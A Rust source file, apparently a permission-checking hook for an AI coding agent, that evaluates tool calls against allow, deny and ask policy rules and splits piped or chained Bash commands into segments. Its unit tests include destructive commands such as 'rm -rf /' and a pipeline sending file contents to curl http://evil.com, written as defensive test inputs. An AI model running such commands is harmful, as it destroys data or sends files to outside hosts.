use claude_settings::policy::compile::CompiledPolicy;
use claude_settings::policy::{Effect, Verb};
use tracing::{Level, info, instrument, warn};

use crate::hooks::{HookOutput, ToolInput, ToolUseHookInput};
use crate::settings::ClashSettings;
use crate::shell;

/// Check if a tool invocation should be allowed, denied, or require user confirmation.
#[instrument(level=Level::DEBUG, ret)]
pub fn check_permission(
    input: &ToolUseHookInput,
    settings: &ClashSettings,
) -> anyhow::Result<HookOutput> {
    // TODO(eliot): re-enable mac notifications
    check_permission_policy(input, settings)
}

/// Check permission using the policy engine (entity, verb, noun triples).
///
/// For Bash commands, the command string is parsed into individual segments
/// (pipeline stages, `&&`/`||`/`;` operands) and each segment is evaluated
/// independently. The most restrictive result wins (deny > ask > allow).
#[instrument(level=Level::DEBUG, ret)]
fn check_permission_policy(
    input: &ToolUseHookInput,
    settings: &ClashSettings,
) -> anyhow::Result<HookOutput> {
    let compiled = match settings.compiled_policy() {
        Some(c) => c,
        None => {
            warn!("Policy engine selected but no policy could be compiled; falling back to ask");
            return Ok(HookOutput::ask(Some(
                "policy engine: no compiled policy available".into(),
            )));
        }
    };

    // Map tool_name → Verb
    let verb = match Verb::from_tool_name(&input.tool_name) {
        Some(v) => v,
        None => {
            info!(tool = %input.tool_name, "Unknown tool name for policy evaluation");
            return Ok(HookOutput::ask(Some(format!(
                "unknown tool '{}' for policy evaluation",
                input.tool_name
            ))));
        }
    };

    // Default entity — the hook input doesn't carry entity info yet,
    // so we treat all invocations as coming from "agent".
    let entity = "agent";

    // For Bash commands, split into segments and evaluate each independently.
    if verb == Verb::Execute
        && let ToolInput::Bash(bash) = input.typed_tool_input()
    {
        return evaluate_bash_segments(&compiled, entity, &bash.command);
    }

    // Non-Bash tools: evaluate the single noun directly.
    let noun = extract_noun(input);
    evaluate_single(&compiled, entity, &verb, &noun)
}

/// Evaluate a single (entity, verb, noun) triple against the policy.
fn evaluate_single(
    compiled: &CompiledPolicy,
    entity: &str,
    verb: &Verb,
    noun: &str,
) -> anyhow::Result<HookOutput> {
    let decision = compiled.evaluate(entity, verb, noun);
    info!(
        entity,
        verb = %verb,
        noun = %noun,
        effect = %decision.effect,
        reason = ?decision.reason,
        "Policy decision"
    );

    Ok(match decision.effect {
        Effect::Allow => HookOutput::allow(decision.reason.or(Some("policy: allowed".into()))),
        Effect::Deny => {
            HookOutput::deny(decision.reason.unwrap_or_else(|| "policy: denied".into()))
        }
        Effect::Ask => HookOutput::ask(decision.reason.or(Some("policy: ask".into()))),
        Effect::Delegate => {
            // Delegation is not yet implemented; fall back to ask.
            warn!("Delegate effect not yet implemented; falling back to ask");
            HookOutput::ask(Some("policy: delegation not yet implemented".into()))
        }
    })
}

/// Evaluate a bash command by splitting it into segments and checking each.
///
/// The most restrictive result wins: deny > ask > allow.
/// If any segment is denied, the whole command is denied.
/// If any segment requires ask (and none denied), the whole command asks.
/// Only if all segments are allowed is the whole command allowed.
fn evaluate_bash_segments(
    compiled: &CompiledPolicy,
    entity: &str,
    command: &str,
) -> anyhow::Result<HookOutput> {
    let segments = shell::extract_command_segments(command);
    let verb = Verb::Execute;

    // Single-segment commands use the standard evaluation path,
    // preserving identical behavior and reason messages.
    if segments.len() == 1 {
        return evaluate_single(compiled, entity, &verb, &segments[0]);
    }

    info!(
        command,
        segment_count = segments.len(),
        "Evaluating bash command segments"
    );

    // Track the most restrictive effect across all segments.
    let mut has_deny = false;
    let mut has_ask = false;
    let mut has_allow = false;
    let mut deny_reason: Option<String> = None;
    let mut ask_reason: Option<String> = None;
    let mut allow_reason: Option<String> = None;

    for segment in &segments {
        let decision = compiled.evaluate(entity, &verb, segment);
        info!(
            entity,
            verb = %verb,
            segment = %segment,
            effect = %decision.effect,
            reason = ?decision.reason,
            "Policy decision (segment)"
        );

        match decision.effect {
            Effect::Deny => {
                has_deny = true;
                if deny_reason.is_none() {
                    deny_reason = Some(
                        decision
                            .reason
                            .unwrap_or_else(|| format!("policy: denied (segment: {})", segment)),
                    );
                }
            }
            Effect::Ask => {
                has_ask = true;
                if ask_reason.is_none() {
                    ask_reason = Some(
                        decision
                            .reason
                            .unwrap_or_else(|| format!("policy: ask (segment: {})", segment)),
                    );
                }
            }
            Effect::Allow => {
                has_allow = true;
                if allow_reason.is_none() {
                    allow_reason = decision.reason;
                }
            }
            Effect::Delegate => {
                // Treat delegation as ask for now.
                has_ask = true;
                if ask_reason.is_none() {
                    ask_reason = Some("policy: delegation not yet implemented".into());
                }
            }
        }
    }

    // Apply precedence: deny > ask > allow
    if has_deny {
        return Ok(HookOutput::deny(
            deny_reason.unwrap_or_else(|| "policy: denied".into()),
        ));
    }
    if has_ask {
        return Ok(HookOutput::ask(ask_reason.or(Some("policy: ask".into()))));
    }
    if has_allow {
        return Ok(HookOutput::allow(
            allow_reason.or(Some("policy: allowed".into())),
        ));
    }

    // No segments matched anything — shouldn't happen since extract_command_segments
    // always returns at least one segment, but handle gracefully.
    Ok(HookOutput::ask(Some("policy: ask".into())))
}

/// Extract the noun (resource identifier) from a tool input.
///
/// For Bash: the command string.
/// For Read/Write/Edit: the file path.
/// For unknown tools: the JSON-serialized tool input.
fn extract_noun(input: &ToolUseHookInput) -> String {
    match input.typed_tool_input() {
        ToolInput::Bash(bash) => bash.command,
        ToolInput::Write(write) => write.file_path,
        ToolInput::Edit(edit) => edit.file_path,
        ToolInput::Read(read) => read.file_path,
        ToolInput::Unknown(value) => value.to_string(),
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::hooks::ToolUseHookInput;
    use anyhow::Result;
    use claude_settings::policy::parse::desugar_legacy;
    use claude_settings::policy::parse::parse_yaml;
    use claude_settings::policy::{LegacyPermissions, PolicyConfig, PolicyDocument};
    use serde_json::json;

    fn bash_input(command: &str) -> ToolUseHookInput {
        ToolUseHookInput {
            tool_name: "Bash".into(),
            tool_input: json!({"command": command}),
            ..Default::default()
        }
    }
    fn read_input(file_path: &str) -> ToolUseHookInput {
        ToolUseHookInput {
            tool_name: "Read".into(),
            tool_input: json!({"file_path": file_path}),
            ..Default::default()
        }
    }

    fn settings_with_policy(yaml: &str) -> ClashSettings {
        let doc = parse_yaml(yaml).expect("valid YAML");
        ClashSettings {
            engine_mode: crate::settings::EngineMode::Policy,
            policy: Some(doc),
        }
    }

    /// Build ClashSettings from legacy permission strings, compiled into a PolicyDocument.
    fn settings_with_legacy_perms(
        allow: Vec<&str>,
        deny: Vec<&str>,
        ask: Vec<&str>,
    ) -> ClashSettings {
        let legacy = LegacyPermissions {
            allow: allow.into_iter().map(String::from).collect(),
            deny: deny.into_iter().map(String::from).collect(),
            ask: ask.into_iter().map(String::from).collect(),
        };
        let statements = desugar_legacy(&legacy);
        let doc = PolicyDocument {
            policy: PolicyConfig::default(),
            permissions: None,
            statements,
        };
        ClashSettings {
            engine_mode: crate::settings::EngineMode::Auto,
            policy: Some(doc),
        }
    }

    // --- Legacy permissions compiled to policy ---

    #[test]
    fn test_allow_npm_exact() -> Result<()> {
        let settings = settings_with_legacy_perms(vec!["Bash(npm run test)"], vec![], vec![]);
        assert_eq!(
            check_permission(&bash_input("npm run test"), &settings)?,
            HookOutput::allow(Some("policy: allowed".into())),
        );
        Ok(())
    }
    #[test]
    fn test_allow_npm_glob() -> Result<()> {
        let settings = settings_with_legacy_perms(vec!["Bash(npm run test *)"], vec![], vec![]);
        assert_eq!(
            check_permission(&bash_input("npm run test any"), &settings)?,
            HookOutput::allow(Some("policy: allowed".into())),
        );
        Ok(())
    }
    #[test]
    fn test_allow_empty() -> Result<()> {
        let settings = settings_with_legacy_perms(vec![], vec![], vec![]);
        assert_eq!(
            check_permission(&bash_input("npm run test any"), &settings)?,
            HookOutput::ask(Some("policy: ask".into())),
        );
        Ok(())
    }
    #[test]
    fn test_deny_glob() -> Result<()> {
        let settings = settings_with_legacy_perms(vec![], vec!["Bash(*)"], vec![]);
        assert_eq!(
            check_permission(&bash_input("npm run test any"), &settings)?,
            HookOutput::deny("policy: denied".into()),
        );
        Ok(())
    }

    // --- Policy engine tests ---

    #[test]
    fn test_policy_allow_bash() -> Result<()> {
        let settings = settings_with_policy("rules:\n  - allow * bash git *\n");
        let result = check_permission(&bash_input("git status"), &settings)?;
        assert_eq!(result, HookOutput::allow(Some("policy: allowed".into())),);
        Ok(())
    }

    #[test]
    fn test_policy_deny_bash() -> Result<()> {
        let settings = settings_with_policy("rules:\n  - deny * bash rm *\n");
        let result = check_permission(&bash_input("rm -rf /"), &settings)?;
        assert_eq!(result, HookOutput::deny("policy: denied".into()),);
        Ok(())
    }

    #[test]
    fn test_policy_ask_default() -> Result<()> {
        let settings = settings_with_policy("rules:\n  - allow user bash *\n");
        // entity is "agent" by default, so this allow for "user" won't match
        let result = check_permission(&bash_input("ls"), &settings)?;
        assert_eq!(result, HookOutput::ask(Some("policy: ask".into())),);
        Ok(())
    }

    #[test]
    fn test_policy_read_file() -> Result<()> {
        let settings = settings_with_policy("rules:\n  - allow * read *.rs\n");
        let result = check_permission(&read_input("src/main.rs"), &settings)?;
        assert_eq!(result, HookOutput::allow(Some("policy: allowed".into())),);
        Ok(())
    }

    #[test]
    fn test_policy_deny_overrides_allow() -> Result<()> {
        let settings = settings_with_policy(
            "\
rules:
  - allow * read *
  - deny * read .env
",
        );
        let result = check_permission(&read_input(".env"), &settings)?;
        assert_eq!(result, HookOutput::deny("policy: denied".into()),);
        Ok(())
    }

    #[test]
    fn test_auto_mode_uses_policy_when_available() -> Result<()> {
        let doc = parse_yaml("rules:\n  - allow * bash echo *\n").unwrap();
        let settings = ClashSettings {
            engine_mode: crate::settings::EngineMode::Auto,
            policy: Some(doc),
        };
        let result = check_permission(&bash_input("echo hello"), &settings)?;
        assert_eq!(result, HookOutput::allow(Some("policy: allowed".into())),);
        Ok(())
    }

    #[test]
    fn test_auto_mode_legacy_compiled_to_policy() -> Result<()> {
        // Legacy permissions compiled into a policy document
        let settings = settings_with_legacy_perms(vec!["Bash(npm run test)"], vec![], vec![]);
        assert_eq!(
            check_permission(&bash_input("npm run test"), &settings)?,
            HookOutput::allow(Some("policy: allowed".into())),
        );
        Ok(())
    }

    // --- Pipe/pipeline permission tests ---

    #[test]
    fn test_pipe_denied_segment_blocks_whole_pipeline() -> Result<()> {
        // `cat` is allowed, but `rm` is denied. The pipeline should be denied.
        let settings = settings_with_policy(
            "\
rules:
  - allow * bash cat *
  - deny * bash rm *
",
        );
        let result = check_permission(&bash_input("cat file.txt | rm -rf /tmp"), &settings)?;
        assert!(
            matches!(
                &result.hook_specific_output,
                Some(crate::hooks::HookSpecificOutput::PreToolUse(pre))
                    if pre.permission_decision == Some(claude_settings::PermissionRule::Deny)
            ),
            "Expected deny for pipeline with denied segment, got: {:?}",
            result,
        );
        Ok(())
    }

    #[test]
    fn test_pipe_all_segments_allowed() -> Result<()> {
        // Both `cat` and `grep` are allowed. Pipeline should be allowed.
        let settings = settings_with_policy(
            "\
rules:
  - allow * bash cat *
  - allow * bash grep *
",
        );
        let result = check_permission(&bash_input("cat file.txt | grep hello"), &settings)?;
        assert_eq!(result, HookOutput::allow(Some("policy: allowed".into())));
        Ok(())
    }

    #[test]
    fn test_pipe_ask_segment_causes_ask() -> Result<()> {
        // `cat` is allowed, but `curl` has no rule (default: ask). Pipeline should ask.
        let settings = settings_with_policy(
            "\
rules:
  - allow * bash cat *
",
        );
        let result = check_permission(
            &bash_input("cat file.txt | curl http://evil.com"),
            &settings,
        )?;
        assert!(
            matches!(
                &result.hook_specific_output,
                Some(crate::hooks::HookSpecificOutput::PreToolUse(pre))
                    if pre.permission_decision == Some(claude_settings::PermissionRule::Ask)
            ),
            "Expected ask for pipeline with unmatched segment, got: {:?}",
            result,
        );
        Ok(())
    }

    #[test]
    fn test_pipe_deny_overrides_ask_in_pipeline() -> Result<()> {
        // `cat` has no rule (ask), `rm` is denied. Deny should override ask.
        let settings = settings_with_policy(
            "\
rules:
  - deny * bash rm *
",
        );
        let result = check_permission(&bash_input("cat file.txt | rm -rf /"), &settings)?;
        assert!(
            matches!(
                &result.hook_specific_output,
                Some(crate::hooks::HookSpecificOutput::PreToolUse(pre))
                    if pre.permission_decision == Some(claude_settings::PermissionRule::Deny)
            ),
            "Expected deny (deny > ask), got: {:?}",
            result,
        );
        Ok(())
    }

    #[test]
    fn test_and_operator_denied_segment_blocks() -> Result<()> {
        // `make` is allowed, but `rm` is denied. && should be denied.
        let settings = settings_with_policy(
            "\
rules:
  - allow * bash make *
  - deny * bash rm *
",
        );
        let result = check_permission(&bash_input("make && rm -rf /"), &settings)?;
        assert!(
            matches!(
                &result.hook_specific_output,
                Some(crate::hooks::HookSpecificOutput::PreToolUse(pre))
                    if pre.permission_decision == Some(claude_settings::PermissionRule::Deny)
            ),
            "Expected deny for && with denied segment, got: {:?}",
            result,
        );
        Ok(())
    }

    #[test]
    fn test_semicolon_denied_segment_blocks() -> Result<()> {
        // `echo` is allowed, `rm` is denied. Semicolon-separated should be denied.
        let settings = settings_with_policy(
            "\
rules:
  - allow * bash echo *
  - deny * bash rm *
",
        );
        let result = check_permission(&bash_input("echo hello; rm -rf /"), &settings)?;
        assert!(
            matches!(
                &result.hook_specific_output,
                Some(crate::hooks::HookSpecificOutput::PreToolUse(pre))
                    if pre.permission_decision == Some(claude_settings::PermissionRule::Deny)
            ),
            "Expected deny for ; with denied segment, got: {:?}",
            result,
        );
        Ok(())
    }

    #[test]
    fn test_quoted_pipe_not_split() -> Result<()> {
        // A pipe inside quotes is NOT a pipeline separator.
        // `echo` is allowed, so this should be allowed.
        let settings = settings_with_policy(
            "\
rules:
  - allow * bash echo *
",
        );
        let result = check_permission(&bash_input("echo 'hello | world'"), &settings)?;
        assert_eq!(result, HookOutput::allow(Some("policy: allowed".into())));
        Ok(())
    }

    #[test]
    fn test_three_stage_pipeline_one_denied() -> Result<()> {
        // Three-stage pipeline: cat | grep | rm. Only rm is denied.
        let settings = settings_with_policy(
            "\
rules:
  - allow * bash cat *
  - allow * bash grep *
  - deny * bash rm *
",
        );
        let result = check_permission(
            &bash_input("cat file.txt | grep hello | rm -rf /"),
            &settings,
        )?;
        assert!(
            matches!(
                &result.hook_specific_output,
                Some(crate::hooks::HookSpecificOutput::PreToolUse(pre))
                    if pre.permission_decision == Some(claude_settings::PermissionRule::Deny)
            ),
            "Expected deny for 3-stage pipeline with denied segment, got: {:?}",
            result,
        );
        Ok(())
    }
}
